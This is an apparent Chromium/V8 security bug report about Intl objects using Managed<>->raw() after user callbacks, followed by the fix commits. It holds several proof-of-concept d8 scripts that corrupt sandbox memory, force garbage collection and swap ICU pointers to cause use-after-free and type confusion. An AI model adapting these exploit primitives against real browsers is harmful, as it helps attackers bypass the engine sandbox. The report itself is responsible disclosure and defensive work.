# Intl.Collator/PluralRules/DateTimeFormat still use Managed<>->raw() not ->get()

| Field | Value |
|-------|-------|
| **Issue ID** | [485286897](https://issues.chromium.org/issues/485286897) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 144.0.0.0 |
| **Reporter** | k1...@gmail.com |
| **Assignee** | em...@google.com |
| **Created** | 2026-02-18 |
| **Bounty** | $5,000.00 |

## Description

# Steps to reproduce the problem

## Steps to reproduce

1. Build V8/d8 with sandbox testing and GC exposure:
   `gn args: v8_enable_sandbox=true, v8_expose_memory_corruption_api=true`
2. Save the PoC below as `poc.js`
3. Run: `./d8 --sandbox-testing --expose-gc poc.js`
4. Observe: crash in ExternalPointerTable::CheckTag (sandbox violation detected)

### PoC (poc.js) — Intl.Collator variant

```
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let collator = new Intl.Collator("en-US");
let addr = Sandbox.getAddressOf(collator);
const ICU_COLLATOR_OFFSET = 12; // icu_collator is first field after JSObject header

let original = mem.getUint32(addr + ICU_COLLATOR_OFFSET, true);
print("[*] Collator at 0x" + addr.toString(16));
print("[*] icu_collator field: 0x" + original.toString(16));

// Baseline works
let cmp = collator.compare;
print("[*] Baseline: compare('a','b') = " + cmp("a", "b"));

let fired = false;
const evil = {
  toString() {
    if (!fired) {
      fired = true;
      let saved = mem.getUint32(addr + ICU_COLLATOR_OFFSET, true);

      // Step 1: Break reference to Managed<Collator>
      mem.setUint32(addr + ICU_COLLATOR_OFFSET, 0x1, true);

      // Step 2: GC frees the unreferenced Managed<> and its ICU Collator
      gc();

      // Step 3: Restore field -> now points to freed Managed<> memory
      mem.setUint32(addr + ICU_COLLATOR_OFFSET, saved, true);
    }
    return "hello";
  }
};

// Triggers: ToString(evil) -> corrupt+gc+restore -> raw() reads freed Managed<>
try {
  let result = cmp(evil, "world");
  print("[!] Compare returned: " + result + " (UAF - raw() read stale data)");
} catch(e) {
  print("[!] Exception: " + e);
}

```
### PoC (poc2.js) — Intl.PluralRules variant

```
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let pr = new Intl.PluralRules("en-US");
let addr = Sandbox.getAddressOf(pr);
const RULES_OFFSET = 20;    // icu_plural_rules
const FORMATTER_OFFSET = 24; // icu_number_formatter

let original_rules = mem.getUint32(addr + RULES_OFFSET, true);
let original_fmt = mem.getUint32(addr + FORMATTER_OFFSET, true);
print("[*] Baseline: select(1) = " + pr.select(1));

let fired = false;
const evil = {
  valueOf() {
    if (!fired) {
      fired = true;
      let saved_rules = mem.getUint32(addr + RULES_OFFSET, true);
      let saved_fmt = mem.getUint32(addr + FORMATTER_OFFSET, true);
      mem.setUint32(addr + RULES_OFFSET, 0x1, true);
      mem.setUint32(addr + FORMATTER_OFFSET, 0x1, true);
      gc();
      mem.setUint32(addr + RULES_OFFSET, saved_rules, true);
      mem.setUint32(addr + FORMATTER_OFFSET, saved_fmt, true);
    }
    return 42;
  }
};

try {
  let result = pr.select(evil);
  print("[!] select returned: " + result + " (UAF)");
} catch(e) {
  print("[!] Exception: " + e);
}

```
### Expected output

```
Crash in ExternalPointerTable::CheckTag or similar sandbox violation,
OR silent UAF (raw() reads from freed/reused Managed<> memory).
With ASan: use-after-free detected on out-of-sandbox ICU C++ object.

```
# Problem Description

## Problem description

This is an unfixed variant of [bug 472139305](https://issues.chromium.org/issues/472139305) (fixed in commit bdc8f396b7d).

### Summary

[Bug 472139305](https://issues.chromium.org/issues/472139305) found that `JSNumberFormat` used `Managed<>->raw()` which
returns a raw C++ pointer without lifetime guarantees. The fix changed it
to `->get()` which returns a `shared_ptr` copy, keeping the ICU object
alive. However, the fix ONLY addressed `JSNumberFormat`. All other Intl
objects still use `->raw()` in the same vulnerable pattern: user JS
callback (toString/valueOf) runs BEFORE `->raw()` is called, allowing
the Managed<> to be freed during the callback.

### Vulnerable Pattern

```
User JS callback (ToString/ToNumber)  <-- attacker corrupts Managed<> field + GC
    |
    v
Managed<ICU_Type>->raw()              <-- reads from freed Managed<> = UAF

```

The fix for NumberFormat changed this to:

```
User JS callback (ToString/ToNumber)  <-- attacker corrupts + GC
    |
    v
Managed<ICU_Type>->get()              <-- shared_ptr keeps ICU object alive

```
### Affected Code Locations (all still using ->raw() after user JS)

**Intl.Collator** — builtins-intl.cc:

- Line 1153: `Object::ToString(isolate, x)` — user JS callback
- Line 1157: `Object::ToString(isolate, y)` — user JS callback
- Line 1161: `collator->icu_collator()->raw()` — UAF read

**Intl.PluralRules** — builtins-intl.cc + js-plural-rules.cc:

- Line 1010: `Object::ToNumber(isolate, number)` — user JS callback
- js-plural-rules.cc:213: `plural_rules->icu_plural_rules()->raw()` — UAF
- js-plural-rules.cc:217: `plural_rules->icu_number_formatter()->raw()` — UAF

**Intl.DateTimeFormat** — js-date-time-format.cc:

- ToNumber(date) at entry point — user JS callback
- Line 658, 664, 680, 683: `->icu_simple_date_format()->raw()` — UAF
- Line 1065, 1075: `->icu_locale()->raw()`, `->icu_number_formatter()->raw()`

**Intl.DurationFormat** — js-duration-format.cc:

- ToDurationRecord triggers user JS (getters on duration-like objects)
- Line 555, 558: `->icu_locale()->raw()`, `->icu_number_formatter()->raw()`
- Line 1065, 1075: same pattern in PartitionDurationFormatPattern

**Intl.ListFormat** — js-list-format.cc:

- Line 228: `format->icu_formatter()->raw()`

**Intl.RelativeTimeFormat** — js-relative-time-format.cc:

- Line 254, 358: `format->icu_formatter()->raw()`

### Impact

Sandbox violation: in-sandbox pointer corruption causes out-of-sandbox
ICU C++ object use-after-free. The `->raw()` call returns a dangling
pointer to a freed ICU object. While the ExternalPointerTable's CheckTag
currently catches the freed Managed<> slot (defense in depth), this is
still a sandbox violation because:

1. In-sandbox data (the Managed<> compressed pointer) controls which
   out-of-sandbox C++ object is dereferenced
2. If EPT slot reuse occurs with a matching tag (same Managed<> type),
   the check passes and a different ICU object is used — type confusion
3. The `->raw()` pattern provides no lifetime guarantee, meaning the
   out-of-sandbox ICU object can be freed while still referenced

### Suggested Fix

Apply the same pattern as bdc8f396b7d to ALL Intl objects: change
`->raw()` to `->get()` (returns `shared_ptr` copy) wherever the raw
pointer is used after a user-observable JS callback. This is a
systematic fix — grep for `->raw()` across all `js-*.cc` Intl files.

# Additional Comments

### Additional comments

This is an unfixed variant of [bug 472139305](https://issues.chromium.org/issues/472139305), which was rewarded as a
sandbox bypass. The fix bdc8f396b7d (commit message: "[intl] Fix Sandbox
Bypass: Use-After-Free in ICU NumberFormatter") only addressed
JSNumberFormat. The exact same vulnerable pattern (->raw() after user JS
callback) exists in at least 6 other Intl object implementations.

A related [bug 454734141](https://issues.chromium.org/issues/454734141) (fixed in 64f7dacb77b) also demonstrated the
same pattern in Intl.Segmenter. That fix also only addressed the single
reported object, not the systematic issue.

The comprehensive list of affected ->raw() call sites:

- builtins-intl.cc:1161 (Collator)
- js-collator.cc:93 (Collator ResolvedOptions)
- js-plural-rules.cc:213,217,235,241,296,337 (PluralRules)
- js-date-time-format.cc:658,664,680,683 (DateTimeFormat)
- js-duration-format.cc:555,558,1065,1075 (DurationFormat)
- js-list-format.cc:228 (ListFormat)
- js-relative-time-format.cc:254,358 (RelativeTimeFormat)

Total: 20+ unfixed ->raw() call sites across 7 Intl object types.

# Summary

Intl.Collator/PluralRules/DateTimeFormat still use Managed<>->raw() not ->get()

# Custom Questions

#### Type of crash:

Tab crash (renderer process crash in ExternalPointerTable::CheckTag).

#### Crash state:

Crash in v8::internal::ExternalPointerTable::CheckTag
during Builtin\_Impl\_CollatorInternalCompare

The crash occurs because the Managed<> ExternalPointerTable entry was
freed during GC (triggered in the toString callback), and the subsequent
->raw() call attempts to read the freed EPT slot. The EPT tag check
detects the mismatch and crashes.

With ASan enabled, the crash manifests as a heap-use-after-free on the
ICU C++ object (icu::Collator, icu::PluralRules, etc.) which lives
outside the V8 sandbox.

#### Reporter credit:

DongHyeon Hwang (kind\_killerwhale)

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6553732808376320.

### ch...@google.com (2026-02-18)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### k1...@gmail.com (2026-02-19)

[Additional evidence: Non-crashing type confusion confirmed in
 Collator.compare and DateTimeFormat.resolvedOptions (new trigger)]

================================================================
[1] Intl.Collator.prototype.compare -- live type confusion
================================================================

PoC (poc_collator_confusion.js):
------------------------------------------------------------------
// Run: ./d8 --sandbox-testing poc_collator_confusion.js

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// victim: en-US (ae-ligature sorts after z in English)
let victim = new Intl.Collator("en-US");
// donor:  de-DE (ae-ligature sorts differently in German)
let donor  = new Intl.Collator("de-DE", { sensitivity:"variant" });

let v_addr = Sandbox.getAddressOf(victim);
let d_addr = Sandbox.getAddressOf(donor);
const ICU_COLLATOR_OFFSET = 12; // icu_collator is first field at kHeaderSize

let v_icu = mem.getUint32(v_addr + ICU_COLLATOR_OFFSET, true);
let d_icu = mem.getUint32(d_addr + ICU_COLLATOR_OFFSET, true);

let cmp = victim.compare.bind(victim);
print("[*] baseline compare('ae','z') = " + cmp("ae", "z"));

let fired = false;
const evil_x = {
  toString() {
    if (!fired) {
      fired = true;
      // Fires at builtins-intl.cc:1152: Object::ToString(isolate, x)
      // Swap before icu_collator()->raw() at builtins-intl.cc:1161
      mem.setUint32(v_addr + ICU_COLLATOR_OFFSET, d_icu, true);
    }
    return "ae";
  }
};

let result = cmp(evil_x, "z");
print("[!] corrupted compare('ae','z') = " + result);
// Collation order changes silently: different ICU Collator used

mem.setUint32(v_addr + ICU_COLLATOR_OFFSET, v_icu, true); // restore
------------------------------------------------------------------

Code path:
  builtins-intl.cc:1152  Object::ToString(isolate, x) <- swap fires here
  builtins-intl.cc:1161  collator->icu_collator()->raw() <- donor ICU used

Confirmed: comparison result changes (donor collator's sort order applied)
without crash. Collation behavior silently corrupted by in-sandbox pointer.

================================================================
[2] Intl.DateTimeFormat.prototype.resolvedOptions via
    LegacyUnwrapReceiver -- new trigger + semantic confusion
================================================================

This is a NEW trigger mechanism not covered in the original report.
Original report used toString callback on format() arguments.
This path uses Proxy get trap on the receiver via resolvedOptions,
exploiting LegacyUnwrapReceiver (intl-objects.cc:700-706).

PoC (poc_dtf_ro_confusion.js):
------------------------------------------------------------------
// Run: ./d8 --sandbox-testing poc_dtf_ro_confusion.js

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let victim = new Intl.DateTimeFormat("en-US",
  { timeZone:"UTC", calendar:"gregory", hour12:true });
let donor  = new Intl.DateTimeFormat("de-DE",
  { timeZone:"Asia/Tokyo", calendar:"buddhist" });

let v_addr = Sandbox.getAddressOf(victim);
let d_addr = Sandbox.getAddressOf(donor);

// JSDateTimeFormat Torque layout (js-date-time-format.tq):
//   locale: String                    // +12
//   icu_locale: Foreign               // +16
//   icu_simple_date_format: Foreign   // +20
//   icu_date_interval_format: Foreign // +24
const ICU_LOCALE_OFFSET = 16;
const ICU_SDF_OFFSET    = 20;

let v_locale = mem.getUint32(v_addr + ICU_LOCALE_OFFSET, true);
let v_sdf    = mem.getUint32(v_addr + ICU_SDF_OFFSET, true);
let d_locale = mem.getUint32(d_addr + ICU_LOCALE_OFFSET, true);
let d_sdf    = mem.getUint32(d_addr + ICU_SDF_OFFSET, true);

let ro = Intl.DateTimeFormat.prototype.resolvedOptions;
print("[*] baseline: " + JSON.stringify(ro.call(victim)));

let fired = false;
const handler = {
  get(target, prop) {
    if (!fired) {
      fired = true;
      // Fires at intl-objects.cc:704 via LegacyUnwrapReceiver
      // Swap both ICU fields to donor's live pointers (same types -> CheckTag passes)
      mem.setUint32(v_addr + ICU_LOCALE_OFFSET, d_locale, true);
      mem.setUint32(v_addr + ICU_SDF_OFFSET,    d_sdf,    true);
    }
    return victim;
  }
};
let proxy = new Proxy(Object.create(Intl.DateTimeFormat.prototype), handler);

let result = ro.call(proxy);
print("[!] corrupted: " + JSON.stringify(result));

// restore
mem.setUint32(v_addr + ICU_LOCALE_OFFSET, v_locale, true);
mem.setUint32(v_addr + ICU_SDF_OFFSET,    v_sdf,    true);
------------------------------------------------------------------

Code path:
  builtins-intl.cc:122      DateTimeFormatPrototypeResolvedOptions
  js-date-time-format.cc:2010  UnwrapDateTimeFormat -> LegacyUnwrapReceiver
  intl-objects.cc:704       Get(proxy, fallback_symbol) <- Proxy trap fires
  js-date-time-format.cc:680   icu_locale()->raw()            <- donor ICU
  js-date-time-format.cc:683   icu_simple_date_format()->raw() <- donor ICU

Confirmed output:
  [*] baseline:  {"locale":"en-US","timeZone":"UTC","calendar":"gregory","hour12":true,...}
  [!] corrupted: {"locale":"en-US","timeZone":"Asia/Tokyo","calendar":"buddhist","hour12":true,...}

locale (in-sandbox String) stays "en-US".
timeZone/calendar (from out-of-sandbox ICU objects) corrupted to donor values.
No crash. EPT tag check bypassed via same-type live donor swap.


### ch...@google.com (2026-02-19)

Setting milestone because of s0/s1 severity.

### is...@chromium.org (2026-02-19)

Thank you for the report.

Assigning to the "fixer" of the whole class of such issues in `Intl` code.

### em...@google.com (2026-03-05)

Working on a fix for all `raw()` callsites.

Regarding [comment #4](https://issues.chromium.org/issues/485286897#comment4): if the examples in this comment only cause a non-crashing behavior change, then it's a non-issue. It's WAI that corrupting sandbox memory may affect program behavior. What would be bad is a POC that uses that to cause a memory write outside of sandbox, which - as far as I can see - the examples in that comment don't demonstrate.

### em...@google.com (2026-03-06)

FWIW the POCs in comment#0 don't demonstrate sandbox bypasses: on Clusterfuzz, the first ends with `Caught harmless memory access violation (inside sandbox)` and the second with `The following harmless error was encountered: Check failed: CheckTag(content, tag_range)`. I.e., these are caught by expected protection mechanisms in the sandbox attacker model.

But the overall report is valid as some of the mentioned `raw()` callsites may trigger UaF by being used beyond GC.

### dx...@google.com (2026-03-09)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@chromium.org](mailto:emaxx@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7635219>

Stop exposing raw ptrs from Managed<>

---


Expand for full commit details
```
     
    Make Managed::raw() temporarily an alias to get(), returning 
    std::shared_ptr (by value, not by a const-ref) instead of a raw pointer. 
     
    The purpose is to provide better lifetime guarantees: with a raw pointer 
    or const-ref-to-shared_ptr, it was easy to make a mistake of keeping a 
    pointer beyond a GC; especially in the presence of sandbox corruptions 
    any such pointer dereference might result in a use-after-free. 
     
    In a follow-up commit, we'll migrate away callsites from raw() to get(). 
    The raw() accessor might be considered for removal, or alternatively 
    requiring a DisallowHeapAllocation witness. 
     
    Bug: 485286897, 489159859, 489482617, 489494032, 489522223 
    Change-Id: I604c6272a27693bb52d79e4653a7856a69c1b1ab 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7635219 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105671}

```

---

Files:

- M `src/api/api.cc`
- M `src/builtins/builtins-intl.cc`
- M `src/compiler/js-call-reducer.cc`
- M `src/compiler/turbofan-graph-visualizer.cc`
- M `src/compiler/turboshaft/turbolev-graph-builder.cc`
- M `src/d8/d8.cc`
- M `src/debug/debug-coverage.cc`
- M `src/debug/debug-interface.cc`
- M `src/debug/debug-wasm-objects.cc`
- M `src/debug/debug.cc`
- M `src/debug/wasm/gdb-server/wasm-module-debug.cc`
- M `src/execution/frames.cc`
- M `src/execution/frames.h`
- M `src/objects/intl-objects.cc`
- M `src/objects/js-collator.cc`
- M `src/objects/js-date-time-format.cc`
- M `src/objects/js-display-names.cc`
- M `src/objects/js-list-format.cc`
- M `src/objects/js-locale.cc`
- M `src/objects/js-number-format.cc`
- M `src/objects/js-plural-rules.cc`
- M `src/objects/js-relative-time-format.cc`
- M `src/objects/js-segments.cc`
- M `src/objects/managed.h`
- M `src/objects/script-inl.h`
- M `src/objects/script.cc`
- M `src/objects/script.h`
- M `src/runtime/runtime-test-wasm.cc`
- M `src/runtime/runtime-wasm.cc`
- M `src/wasm/c-api.cc`
- M `src/wasm/interpreter/wasm-interpreter-runtime.cc`
- M `src/wasm/module-compiler.cc`
- M `src/wasm/module-instantiate.cc`
- M `src/wasm/wasm-debug.cc`
- M `src/wasm/wasm-module.cc`
- M `src/wasm/wasm-objects-inl.h`
- M `src/wasm/wasm-objects.cc`
- M `src/wasm/wasm-objects.h`
- M `test/cctest/wasm/test-liftoff-inspection.cc`
- M `test/cctest/wasm/test-streaming-compilation.cc`
- M `test/cctest/wasm/test-wasm-breakpoints.cc`
- M `test/cctest/wasm/test-wasm-serialization.cc`
- M `test/common/wasm/fuzzer-common.cc`
- M `test/common/wasm/wasm-run-utils.cc`
- M `test/unittests/wasm/compilation-hints-unittest.cc`
- M `test/unittests/wasm/wasm-tracing-unittest.cc`

---

Hash: [9bc50dbd7a574ac448f05ff293dd94fba4fe3745](https://chromiumdash.appspot.com/commit/9bc50dbd7a574ac448f05ff293dd94fba4fe3745)  

Date: Fri Mar 6 23:36:02 2026


---

### dx...@google.com (2026-03-11)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@chromium.org](mailto:emaxx@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7653848>

Revert "Stop exposing raw ptrs from Managed<>"

---


Expand for full commit details
```
     
    This reverts commit 9bc50dbd7a574ac448f05ff293dd94fba4fe3745. 
     
    Reason for revert: perf regressions (crbug.com/491028578, crbug.com/491521117). 
     
    Original change's description: 
    > Stop exposing raw ptrs from Managed<> 
    > 
    > Make Managed::raw() temporarily an alias to get(), returning 
    > std::shared_ptr (by value, not by a const-ref) instead of a raw pointer. 
    > 
    > The purpose is to provide better lifetime guarantees: with a raw pointer 
    > or const-ref-to-shared_ptr, it was easy to make a mistake of keeping a 
    > pointer beyond a GC; especially in the presence of sandbox corruptions 
    > any such pointer dereference might result in a use-after-free. 
    > 
    > In a follow-up commit, we'll migrate away callsites from raw() to get(). 
    > The raw() accessor might be considered for removal, or alternatively 
    > requiring a DisallowHeapAllocation witness. 
    > 
    > Bug: 485286897, 489159859, 489482617, 489494032, 489522223 
    > Change-Id: I604c6272a27693bb52d79e4653a7856a69c1b1ab 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7635219 
    > Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    > Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#105671} 
     
    Bug: 485286897, 489159859, 489482617, 489494032, 489522223, 491028578, 491521117 
    Bug: 485286897, 489159859, 489482617, 489494032, 489522223 
    Change-Id: Ifb96295c081b36894ce4ddf8f3d0a49c51948fbb 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7653848 
    Auto-Submit: Maksim Ivanov <emaxx@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105724}

```

---

Files:

- M `src/api/api.cc`
- M `src/builtins/builtins-intl.cc`
- M `src/compiler/js-call-reducer.cc`
- M `src/compiler/turbofan-graph-visualizer.cc`
- M `src/compiler/turboshaft/turbolev-graph-builder.cc`
- M `src/d8/d8.cc`
- M `src/debug/debug-coverage.cc`
- M `src/debug/debug-interface.cc`
- M `src/debug/debug-wasm-objects.cc`
- M `src/debug/debug.cc`
- M `src/debug/wasm/gdb-server/wasm-module-debug.cc`
- M `src/execution/frames.cc`
- M `src/execution/frames.h`
- M `src/objects/intl-objects.cc`
- M `src/objects/js-collator.cc`
- M `src/objects/js-date-time-format.cc`
- M `src/objects/js-display-names.cc`
- M `src/objects/js-list-format.cc`
- M `src/objects/js-locale.cc`
- M `src/objects/js-number-format.cc`
- M `src/objects/js-plural-rules.cc`
- M `src/objects/js-relative-time-format.cc`
- M `src/objects/js-segments.cc`
- M `src/objects/managed.h`
- M `src/objects/script-inl.h`
- M `src/objects/script.cc`
- M `src/objects/script.h`
- M `src/runtime/runtime-test-wasm.cc`
- M `src/runtime/runtime-wasm.cc`
- M `src/wasm/c-api.cc`
- M `src/wasm/interpreter/wasm-interpreter-runtime.cc`
- M `src/wasm/module-compiler.cc`
- M `src/wasm/module-instantiate.cc`
- M `src/wasm/wasm-debug.cc`
- M `src/wasm/wasm-module.cc`
- M `src/wasm/wasm-objects-inl.h`
- M `src/wasm/wasm-objects.cc`
- M `src/wasm/wasm-objects.h`
- M `test/cctest/wasm/test-liftoff-inspection.cc`
- M `test/cctest/wasm/test-streaming-compilation.cc`
- M `test/cctest/wasm/test-wasm-breakpoints.cc`
- M `test/cctest/wasm/test-wasm-serialization.cc`
- M `test/common/wasm/fuzzer-common.cc`
- M `test/common/wasm/wasm-run-utils.cc`
- M `test/unittests/wasm/compilation-hints-unittest.cc`
- M `test/unittests/wasm/wasm-tracing-unittest.cc`

---

Hash: [0d823bd414136d9167b89c5a92271b8f54f93f8e](https://chromiumdash.appspot.com/commit/0d823bd414136d9167b89c5a92271b8f54f93f8e)  

Date: Wed Mar 11 10:59:43 2026


---

### dx...@google.com (2026-03-18)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7664527>

[intl] Fix Managed ptr lifetime in js-date-time-format

---


Expand for full commit details
```
     
    Fix usages of raw pointers to the Managed<> underlying storage in 
    js-date-time-format.cc. 
     
    To guarantee the correctness of pointer dereferences, we either need to 
    keep the std::shared_ptr ref counter incremented, or we need to provide 
    the "no garbage collection" witness. 
     
    This CL is a new attempt after the reverted r105671. 
     
    Bug: 485286897, 489159859 
    Change-Id: I456340af4a499e67be84099e938fdecccde8bb36 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7664527 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105857}

```

---

Files:

- M `src/objects/js-date-time-format.cc`
- M `src/objects/managed.h`

---

Hash: [176fc9b0f66398b898f0fe1f29fd35df63f3482b](https://chromiumdash.appspot.com/commit/176fc9b0f66398b898f0fe1f29fd35df63f3482b)  

Date: Mon Mar 16 13:50:18 2026


---

### dx...@google.com (2026-03-20)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7679159>

Safer getters in Managed<>

---


Expand for full commit details
```
     
    Introduce a wrapper Managed<>::Ptr as an alternative to the current 
    "std::shared_ptr<>& get()" getter on non-performance-critical paths. The 
    new wrapper takes care of keeping the ref counter incremented, which is 
    necessary in cases where the in-sandbox memory corruption is possible 
    and GC is potentially triggered. 
     
    The user is expected to keep the wrapper alive as long as the 
    dereferenced pointer is used. We enable Clang's static analysis 
    ([[clang::lifetimebound]], -Wlifetime-safety) to catch most of 
    violations of this rule in the future. 
     
    Also mark the "no_gc" parameter of the "raw()" getter as lifetimebound, 
    so that the compiler warns if the pointer is used after leaving the 
    witness' scope. 
     
    Bug: 485286897, 489159859 
    Change-Id: If71097ca089f10b876f01769053f6b30231ab27a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7679159 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Reviewed-by: Dominik Inführ <dinfuehr@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105917}

```

---

Files:

- M `src/objects/js-date-time-format.cc`
- M `src/objects/managed.h`

---

Hash: [9f32e32139f8088da586e83822dd352c9761a878](https://chromiumdash.appspot.com/commit/9f32e32139f8088da586e83822dd352c9761a878)  

Date: Thu Mar 19 23:17:04 2026


---

### dx...@google.com (2026-03-20)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7687810>

[intl] Fix Managed ptr lifetime in js-locale

---


Expand for full commit details
```
     
    Fix usages of raw pointers to the Managed<> underlying storage in 
    js-locale.cc. To guarantee they're safe in the sandbox attacker model, 
    we use the ptr() getter and keep the ref counter incremented for the 
    duration of the operation. 
     
    Bug: 485286897, 489494032 
    Change-Id: I99ed40687d1879c0c0741ca8190c41fe7d75a19b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7687810 
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105939}

```

---

Files:

- M `src/objects/js-locale.cc`

---

Hash: [c736e1378c9bb0d94b3e7aca006e667ca6615141](https://chromiumdash.appspot.com/commit/c736e1378c9bb0d94b3e7aca006e667ca6615141)  

Date: Fri Mar 20 13:53:57 2026


---

### dx...@google.com (2026-03-24)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7695452>

[intl] More Managed ptr lifetime fixes

---


Expand for full commit details
```
     
    Fix usages of raw pointers to the Managed<> underlying storage in 
    intl-related code. To guarantee they're safe in the sandbox attacker 
    model, we use the ptr() getter and keep the ref counter incremented for 
    the duration of the operation. 
     
    This CL continues the chain of CLs crrev.com/c/7687810, 
    crrev.com/c/7679159. 
     
    Bug: 485286897 
    Change-Id: I11bc566fccc1f8c4ab4dcb39da78984753a52851 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7695452 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105997}

```

---

Files:

- M `src/builtins/builtins-intl.cc`
- M `src/objects/intl-objects.cc`
- M `src/objects/js-break-iterator.cc`
- M `src/objects/js-collator.cc`
- M `src/objects/js-date-time-format.cc`
- M `src/objects/js-display-names.cc`
- M `src/objects/js-duration-format.cc`
- M `src/objects/js-list-format.cc`
- M `src/objects/js-number-format.cc`
- M `src/objects/js-number-format.h`
- M `src/objects/js-plural-rules.cc`
- M `src/objects/js-relative-time-format.cc`
- M `src/objects/js-segment-iterator.cc`
- M `src/objects/js-segments.cc`
- M `src/objects/managed.h`

---

Hash: [bdf51b8fe17de7f5240273d61ff829519cc67589](https://chromiumdash.appspot.com/commit/bdf51b8fe17de7f5240273d61ff829519cc67589)  

Date: Tue Mar 24 10:00:03 2026


---

### em...@google.com (2026-03-25)

A note to myself: consider `TrustedManaged` accessors in scope for the bug as well; this is essentially the same problematic pattern with raw pointers and references to `shared_ptr`. (My original CL above did try to tackle it, but caused perf regressions. Then I got unsure if we need to "harden" the `trustedManaged` at all. But after talking to people, it seems we do unless otherwise proven.)

### dx...@google.com (2026-03-26)

Project: v8/v8  

Branch:  main  

Author:  Manish Goregaokar [manishearth@google.com](mailto:manishearth@google.com)  

Link:    <https://chromium-review.googlesource.com/7705252>

[temporal] Use wrapped\_rust() in builtins-temporal.cc

---


Expand for full commit details
```
     
    Somehow this was missed in https://crrev.com/c/7584815 
     
    Bug: 485286897 
    Change-Id: I4a486242c66ab57a7e0ea8e46ba1d2306a6a6964 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7705252 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Auto-Submit: Manish Goregaokar <manishearth@google.com> 
    Reviewed-by: Maksim Ivanov <emaxx@chromium.org> 
    Commit-Queue: Manish Goregaokar <manishearth@google.com> 
    Cr-Commit-Position: refs/heads/main@{#106086}

```

---

Files:

- M `src/builtins/builtins-temporal.cc`

---

Hash: [16384e10c8cf8f039a20020a9ed20714280f7fe1](https://chromiumdash.appspot.com/commit/16384e10c8cf8f039a20020a9ed20714280f7fe1)  

Date: Thu Mar 26 15:38:46 2026


---

### dx...@google.com (2026-03-27)

Project: v8/v8  

Branch:  main  

Author:  Clemens Backes [clemensb@chromium.org](mailto:clemensb@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7697977>

[wasm] Avoid UaF via `WasmModuleObject::native_module()`

---


Expand for full commit details

```[wasm] Avoid UaF via `WasmModuleObject::native_module()`

```
Return a `Managed<NativeModule>::Ptr` instead of a raw `NativeModule*`. 
 
R=emaxx@chromium.org 
 
Bug: 495558999, 485286897 
Change-Id: I8d9ddd201e25b6c1a52ef8b12a2649279f5f3b9f 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7697977 
Reviewed-by: Jakob Linke <jgruber@chromium.org> 
Reviewed-by: Maksim Ivanov <emaxx@chromium.org> 
Reviewed-by: Paolo Severini <paolosev@microsoft.com> 
Commit-Queue: Clemens Backes <clemensb@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#106105}

```
```

---

Files:
* M       `src/d8/d8.cc`
* M       `src/debug/debug-coverage.cc`
* M       `src/debug/debug-interface.cc`
* M       `src/debug/debug-wasm-objects.cc`
